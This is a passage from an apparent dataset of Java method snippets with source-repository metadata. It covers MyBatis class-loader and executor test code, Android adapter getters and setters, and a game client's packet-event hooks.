URL url;    for (ClassLoader cl : classLoader) {      if (null != cl) {        // look for the resource as passed in...        url = cl.getResource(resource);        // ...but some class loaders want this leading \"/\", so we'll add it        // and try again if we didn't find the resource        if (null == url) {          url = cl.getResource(\"/\" + resource);        }        // \"It's always in the last place I look for it!\"        // ... because only an idiot would keep looking for it after finding it, so stop looking already.        if (null != url) {          return url;        }      }    }    // didn't find it anywhere.    return null;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "classForName", "params": ["String", "ClassLoader"], "throws": ["ClassNotFoundException"], "modifiers": [], "return_type": "Class<?>", "snippet": "  Class<?> classForName(String name, ClassLoader[] classLoader) throws ClassNotFoundException {    for (ClassLoader cl : classLoader) {      if (null != cl) {        try {          Class<?> c = Class.forName(name, true, cl);          if (null != c) {            return c;          }        } catch (ClassNotFoundException e) {          // we'll ignore this until all classloaders fail to locate the class        }      }    }    throw new ClassNotFoundException(\"Cannot find class: \" + name);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getClassLoaders", "params": ["ClassLoader"], "throws": null, "modifiers": [], "return_type": "ClassLoader", "snippet": "  ClassLoader[] getClassLoaders(ClassLoader classLoader) {    return new ClassLoader[]{        classLoader,        defaultClassLoader,        Thread.currentThread().getContextClassLoader(),        getClass().getClassLoader(),        systemClassLoader};  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/io/ClassLoaderWrapper.java", "stars": "15", "class": {"name": "ClassLoaderWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLastPage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getLastPage() {\t\treturn lastPage;\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "setLastPage", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setLastPage(int lastPage) {\t\tthis.lastPage = lastPage;\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "size", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int size() {\t\treturn mItems.size();\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "get", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object get(int index) {\t\treturn mItems.get(index);\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "indexOf", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int indexOf(Object item) {\t\treturn mItems.indexOf(item);\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "notifyArrayItemRangeChanged", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void notifyArrayItemRangeChanged(int positionStart, int itemCount) {\t\tnotifyItemRangeChanged(positionStart, itemCount);\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getIsUpdating", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "\tpublic Boolean getIsUpdating() {\t\treturn isUpdating;\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "setIsUpdating", "params": ["Boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setIsUpdating(Boolean isUpdating) {\t\tthis.isUpdating = isUpdating;\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getCount() {\t\treturn mItems.size();\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "add", "params": ["Media"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void add(Media media) {\t\tadd(mItems.size(), media);\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "add", "params": ["int", "Media"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void add(int index, Media media) {\t\tmItems.add(index, media);\t\tnotifyItemRangeInserted(index, 1);\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "addAll", "params": ["int", "Collection"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void addAll(int index, Collection items) {\t\tint itemsCount = items.size();\t\tmItems.addAll(index, items);\t\tnotifyItemRangeInserted(index, itemsCount);\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "remove", "params": ["Media"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean remove(Media item) {\t\tint index = mItems.indexOf(item);\t\tif (index >= 0) {\t\t\tmItems.remove(index);\t\t\tnotifyItemRangeRemoved(index, 1);\t\t}\t\treturn index >= 0;\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "removeItems", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int removeItems(int position, int count) {\t\tint itemsToRemove = Math.min(count, mItems.size() - position);\t\tfor (int i = 0; i < itemsToRemove; i++) {\t\t\tmItems.remove(position);\t\t}\t\tnotifyItemRangeRemoved(position, itemsToRemove);\t\treturn itemsToRemove;\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "clear", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clear() {\t\tint itemCount = mItems.size();\t\tmItems.clear();\t\tnotifyItemRangeRemoved(0, itemCount);\t}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/adapters/MediaObjectAdapter.java", "stars": "4", "class": {"name": "MediaObjectAdapter", "extends": "ArrayObjectAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "test", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void test() {\t    Integer a = new Integer(3);\t    Integer b = new Integer(3);\t    System.out.println(a.intValue() == b.intValue());\t}", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/test/java/com/loststars/dynamic/datasource/QuickbuyApplicationTests.java", "stars": "1", "class": {"name": "QuickbuyApplicationTests", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onSendPacket", "params": ["Packet<?>", "CallbackInfo"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onSendPacket(Packet<?> packet, CallbackInfo callbackInfo) {        PacketEvent event = new PacketEvent(PacketEvent.Type.OUTGOING, packet);        Mercury.INSTANCE.getEventManager().fireEvent(event);        if (event.isCancelled()) {            callbackInfo.cancel();        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinNetworkManager.java", "stars": "12", "class": {"name": "MixinNetworkManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onChannelRead", "params": ["ChannelHandlerContext", "Packet<?>", "CallbackInfo"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onChannelRead(ChannelHandlerContext context, Packet<?> packet, CallbackInfo callbackInfo) {        PacketEvent event = new PacketEvent(PacketEvent.Type.INCOMING, packet);        Mercury.INSTANCE.getEventManager().fireEvent(event);        if (event.isCancelled()) {            callbackInfo.cancel();        }    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinNetworkManager.java", "stars": "12", "class": {"name": "MixinNetworkManager", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "contextLoads", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void contextLoads() {    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/flyway/src/test/java/com/yyj/flywaydb/FlywaydbApplicationTests.java", "stars": "2", "class": {"name": "FlywaydbApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getTransformerName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTransformerName() {        return transformerName;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/transformer/Transformer.java", "stars": "23", "class": {"name": "Transformer", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setTransformerName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTransformerName(String transformerName) {        this.transformerName = transformerName;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/transformer/Transformer.java", "stars": "23", "class": {"name": "Transformer", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "evaluate", "params": ["Record", "Object"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "Record", "snippet": "    abstract public Record evaluate(Record record, Object... paras);}", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/transformer/Transformer.java", "stars": "23", "class": {"name": "Transformer", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getName() {\t\treturn name;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android%20Contact%20ListView/src/com/samir/ContactBean.java", "stars": "74", "class": {"name": "ContactBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setName(String name) {\t\tthis.name = name;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android%20Contact%20ListView/src/com/samir/ContactBean.java", "stars": "74", "class": {"name": "ContactBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPhoneNo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getPhoneNo() {\t\treturn phoneNo;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android%20Contact%20ListView/src/com/samir/ContactBean.java", "stars": "74", "class": {"name": "ContactBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setPhoneNo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPhoneNo(String phoneNo) {\t\tthis.phoneNo = phoneNo;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android%20Contact%20ListView/src/com/samir/ContactBean.java", "stars": "74", "class": {"name": "ContactBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSize", "params": ["int", "int"], "throws": null, "modifiers": ["abstract"], "return_type": "void", "snippet": "    abstract void setSize(int width, int height);    abstract void setView(View view);    abstract void setGravity(int gravity, int xOffset, int yOffset);    abstract void init();    abstract void dismiss();    void updateXY(int x, int y) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "setView", "params": ["View"], "throws": null, "modifiers": ["abstract"], "return_type": "void", "snippet": "    abstract void setView(View view);    abstract void setGravity(int gravity, int xOffset, int yOffset);    abstract void init();    abstract void dismiss();    void updateXY(int x, int y) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "setGravity", "params": ["int", "int", "int"], "throws": null, "modifiers": ["abstract"], "return_type": "void", "snippet": "    abstract void setGravity(int gravity, int xOffset, int yOffset);    abstract void init();    abstract void dismiss();    void updateXY(int x, int y) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["abstract"], "return_type": "void", "snippet": "    abstract void init();    abstract void dismiss();    void updateXY(int x, int y) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "dismiss", "params": [], "throws": null, "modifiers": ["abstract"], "return_type": "void", "snippet": "    abstract void dismiss();    void updateXY(int x, int y) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "updateXY", "params": ["int", "int"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void updateXY(int x, int y) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "updateX", "params": ["int"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void updateX(int x) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "updateY", "params": ["int"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void updateY(int y) {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "getX", "params": [], "throws": null, "modifiers": [], "return_type": "int", "snippet": "    int getX() {        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "getY", "params": [], "throws": null, "modifiers": [], "return_type": "int", "snippet": "    int getY() {        return 0;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/utils/floatUtil/FloatView.java", "stars": "2", "class": {"name": "FloatView", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "getItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Fragment", "snippet": "    public Fragment getItem(int position) {        switch (position) {            case 0:                return StatusFragment.newInstance();            case 1:                return DeploysFragment.newInstance();            case 2:                return MachinesFragment.newInstance();            case 3:                return SettingsFragment.newInstance();        }        return PlaceholderFragment.newInstance(position + 1);    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/ui/main/SectionsPagerAdapter.java", "stars": "1", "class": {"name": "SectionsPagerAdapter", "extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getPageTitle", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "CharSequence", "snippet": "    public CharSequence getPageTitle(int position) {        return mContext.getResources().getString(TAB_TITLES[position]);    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/ui/main/SectionsPagerAdapter.java", "stars": "1", "class": {"name": "SectionsPagerAdapter", "extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {        return TAB_TITLES.length;    }", "url": "https://raw.githubusercontent.com/harvestcore/ipmdroid/master/app/src/main/java/com/agm/ipmanager/ui/main/SectionsPagerAdapter.java", "stars": "1", "class": {"name": "SectionsPagerAdapter", "extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "getStartLineNum", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getStartLineNum() {        return startLineNum;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/LogResult.java", "stars": "23", "class": {"name": "LogResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setStartLineNum", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStartLineNum(int startLineNum) {        this.startLineNum = startLineNum;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/LogResult.java", "stars": "23", "class": {"name": "LogResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getEndLineNum", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getEndLineNum() {        return endLineNum;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/LogResult.java", "stars": "23", "class": {"name": "LogResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEndLineNum", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEndLineNum(int endLineNum) {        this.endLineNum = endLineNum;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/LogResult.java", "stars": "23", "class": {"name": "LogResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLogContent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLogContent() {        return logContent;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/LogResult.java", "stars": "23", "class": {"name": "LogResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLogContent", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLogContent(String logContent) {        this.logContent = logContent;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/LogResult.java", "stars": "23", "class": {"name": "LogResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isEnd", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isEnd() {        return isEnd;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/LogResult.java", "stars": "23", "class": {"name": "LogResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEnd", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEnd(boolean end) {        isEnd = end;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/LogResult.java", "stars": "23", "class": {"name": "LogResult", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setup", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setup() throws Exception {    ds = createBlogDataSource();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldInsertNewAuthorWithBeforeAutoKey", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldInsertNewAuthorWithBeforeAutoKey() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      Author author = new Author(-1, \"someone\", \"******\", \"someone@apache.org\", null, Section.NEWS);      MappedStatement insertStatement = ExecutorTestHelper.prepareInsertAuthorMappedStatementWithBeforeAutoKey(config);      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectOneAuthorMappedStatement(config);      int rows = executor.update(insertStatement, author);      assertTrue(rows > 0 || rows == BatchExecutor.BATCH_UPDATE_RETURN_VALUE);      if (rows == BatchExecutor.BATCH_UPDATE_RETURN_VALUE) {        executor.flushStatements();      }      assertEquals(123456, author.getId());      if (author.getId() != BatchExecutor.BATCH_UPDATE_RETURN_VALUE) {        List<Author> authors = executor.query(selectStatement, author.getId(), RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);        executor.rollback(true);        assertEquals(1, authors.size());        assertEquals(author.toString(), authors.get(0).toString());        assertTrue(author.getId() >= 10000);      }    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldInsertNewAuthor", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldInsertNewAuthor() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      Author author = new Author(99, \"someone\", \"******\", \"someone@apache.org\", null, Section.NEWS);      MappedStatement insertStatement = ExecutorTestHelper.prepareInsertAuthorMappedStatement(config);      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectOneAuthorMappedStatement(config);      int rows = executor.update(insertStatement, author);      List<Author> authors = executor.query(selectStatement, 99, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      executor.rollback(true);      assertEquals(1, authors.size());      assertEquals(author.toString(), authors.get(0).toString());      assertTrue(1 == rows || BatchExecutor.BATCH_UPDATE_RETURN_VALUE == rows);    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldSelectAllAuthorsAutoMapped", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldSelectAllAuthorsAutoMapped() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectAllAuthorsAutoMappedStatement(config);      List<Author> authors = executor.query(selectStatement, null, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      assertEquals(2, authors.size());      Author author = authors.get(0);      // id,username, password, email, bio, favourite_section      // (101,'jim','********','jim@ibatis.apache.org','','NEWS');      assertEquals(101, author.getId());      assertEquals(\"jim\", author.getUsername());      assertEquals(\"jim@ibatis.apache.org\", author.getEmail());      assertEquals(\"\", author.getBio());      assertEquals(Section.NEWS, author.getFavouriteSection());    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldInsertNewAuthorWithAutoKey", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldInsertNewAuthorWithAutoKey() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      Author author = new Author(-1, \"someone\", \"******\", \"someone@apache.org\", null, Section.NEWS);      MappedStatement insertStatement = ExecutorTestHelper.prepareInsertAuthorMappedStatementWithAutoKey(config);      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectOneAuthorMappedStatement(config);      int rows = executor.update(insertStatement, author);      assertTrue(rows > 0 || rows == BatchExecutor.BATCH_UPDATE_RETURN_VALUE);      if (rows == BatchExecutor.BATCH_UPDATE_RETURN_VALUE) {        executor.flushStatements();      }      assertTrue(-1 != author.getId());      if (author.getId() != BatchExecutor.BATCH_UPDATE_RETURN_VALUE) {        List<Author> authors = executor.query(selectStatement, author.getId(), RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);        executor.rollback(true);        assertEquals(1, authors.size());        assertEquals(author.toString(), authors.get(0).toString());        assertTrue(author.getId() >= 10000);      }    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldInsertNewAuthorByProc", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldInsertNewAuthorByProc() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      Author author = new Author(97, \"someone\", \"******\", \"someone@apache.org\", null, null);      MappedStatement insertStatement = ExecutorTestHelper.prepareInsertAuthorProc(config);      MappedStatement selectStatement = ExecutorTestHelper.prepareSelectOneAuthorMappedStatement(config);      int rows = executor.update(insertStatement, author);      List<Author> authors = executor.query(selectStatement, 97, RowBounds.DEFAULT, Executor.NO_RESULT_HANDLER);      executor.flushStatements();      executor.rollback(true);      assertEquals(1, authors.size());      assertEquals(author.toString(), authors.get(0).toString());    } finally {      executor.rollback(true);      executor.close(false);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/executor/BaseExecutorTest.java", "stars": "15", "class": {"name": "BaseExecutorTest", "extends": "BaseDataTest", "implements": null, "modifiers": []}}, {"method_name": "shouldInsertNewAuthorUsingSimpleNonPreparedStatements", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldInsertNewAuthorUsingSimpleNonPreparedStatements() throws Exception {    Executor executor = createExecutor(new JdbcTransaction(ds, null, false));    try {      Author author = new Author(99, \"someone\", \"******\", \"someone@apache.org\", null, null);      MappedStatement insertStatement = ExecutorTestHelper.createInsertAuthorWithIDof99MappedStatement(config);      MappedStatement selectStatement = 